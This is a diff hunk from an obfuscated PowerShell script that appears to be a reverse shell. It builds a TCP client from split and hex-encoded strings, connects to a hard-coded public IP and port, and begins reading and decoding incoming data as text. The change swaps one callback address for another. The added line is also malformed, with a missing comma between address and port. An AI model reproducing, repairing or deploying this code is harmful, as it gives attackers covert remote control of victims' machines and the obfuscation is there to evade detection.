@@ -20,7 +20,7 @@ $str = "TcP"+"C"+"li"+"e"+"nt";$reversed = -join ($str[-1..-($str.Length)]);
 $PJ = @("54", "43", "50", "43", "6C", "69", "65", "6E", "74");
 $TChar = $PJ | ForEach-Object { [char][convert]::ToInt32($_, 16) };
 $PJChar = -join $TChar;
-;$ZMdPEN = &('Ne'+'w'+'-'+'Ob'+'je'+'ct') ('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')('172.237.65.217',36323);
+;$ZMdPEN = &('Ne'+'w'+'-'+'Ob'+'je'+'ct') ('S'+'y'+'s'+'t'+'e'+'m'+'.'+'N'+'e'+'t'+'.'+'S'+'ockets.TCPClient')('193.161.193.99' 31818);
 $rkrvBB = $ZMdPEN.('Get'+'Stream')();[byte[]]$PJChar = 0..65535|%{0};
 while(($i = $rkrvBB.ReAd($PJChar, 0, $PJChar.LeNgTh)) -ne 0){;
 $97936524 = (&('Ne'+'w'+'-'+'Ob'+'je'+'ct') -TypENAme Sy''Ste''M.tExT.A''SCi''iEN''coding).('Ge'+'tStRinG')($PJChar,0, $i);
